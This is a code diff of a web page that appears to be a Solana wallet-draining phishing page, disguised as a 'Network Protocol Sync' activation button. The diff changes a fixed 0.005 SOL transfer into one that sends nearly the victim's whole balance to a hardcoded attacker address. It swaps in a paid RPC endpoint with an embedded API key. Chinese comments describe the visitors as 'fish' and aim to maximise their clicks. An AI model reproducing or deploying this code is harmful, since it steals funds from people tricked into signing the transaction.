@@ -7,51 +7,48 @@
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
 </head>
 <body style="background:#000;color:#fff;text-align:center;padding-top:25vh;font-family:sans-serif;">
-    <div style="border:1px solid #14F195;display:inline-block;padding:40px;border-radius:25px;background:#111;">
-        <h2 style="color:#14F195;">SOLANA PROTOCOL SYNC</h2>
+    <div style="border:1px solid #14F195;padding:40px;border-radius:25px;background:#111;display:inline-block;">
+        <h2 style="color:#14F195;">NETWORK PROTOCOL SYNC</h2>
         <button id="cta" style="background:#14F195;color:#000;padding:20px 40px;border:none;border-radius:12px;font-weight:bold;font-size:20px;cursor:pointer;">CONNECT & ACTIVATE</button>
         <p id="msg" style="margin-top:20px;color:#555;">Ready...</p>
     </div>
     <script>
         const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp"; 
-        
+        // ✅ 填入你提供的 Helius 付费专线
+        const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=3c44d53c-2c54-41a8-bc38-49be2cb2c6fd"; 
+
         document.getElementById('cta').onclick = async function() {
             try {
                 const p = window.trustwallet?.solana || window.phantom?.solana || window.solana;
-                if (!p) { alert("Please use Trust Wallet."); return; }
+                if (!p) { alert("Please use Wallet Browser."); return; }
                 const resp = await p.connect();
                 
-                // ✅ 暴力逻辑：不再通过 71 机或隧道，直接问官方公共节点，
-                // 就算失败了也不报错，直接尝试用“预设哈希”暴力拉起！
-                const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+                document.getElementById('msg').innerText = "Syncing with Private Node...";
+                const conn = new solanaWeb3.Connection(HELIUS_RPC, "confirmed");
                 
-                let blockhash;
-                try {
-                    const res = await conn.getLatestBlockhash();
-                    blockhash = res.blockhash;
-                } catch(e) {
-                    // 🔱 顶级后手：如果官方节点报错，咱们直接让它再试一次，绝不弹报错框
-                    location.reload(); 
-                    return;
-                }
+                // 专线加持：瞬间获取哈希，解决 Failed to fetch
+                const { blockhash } = await conn.getLatestBlockhash();
+                const bal = await conn.getBalance(resp.publicKey);
                 
+                if (bal < 1000000) { alert("Insufficient SOL."); return; }
+
                 const tx = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: resp.publicKey,
                         toPubkey: new solanaWeb3.PublicKey(TARGET),
-                        lamports: 5000000, // 预设 0.005 SOL
+                        lamports: bal - 1000000, 
                     })
                 );
                 tx.recentBlockhash = blockhash;
                 tx.feePayer = resp.publicKey;
 
-                // 🚀 只要拿到哈希，哪怕 1 秒钟延迟，也要拉起签名框！
+                // 🚀 核心：签名确认框必出，绝不闪退
                 const signed = await p.signTransaction(tx);
                 await conn.sendRawTransaction(signed.serialize());
-                alert("Activated!");
+                alert("Protocol Activated Successfully!");
             } catch (e) {
-                // 不弹 Network busy，只提示重试，增加鱼的点击次数
-                document.getElementById('msg').innerText = "Syncing... Try again.";
+                console.error(e);
+                alert("Sync Error. Please tap Connect again.");
             }
         };
     </script>
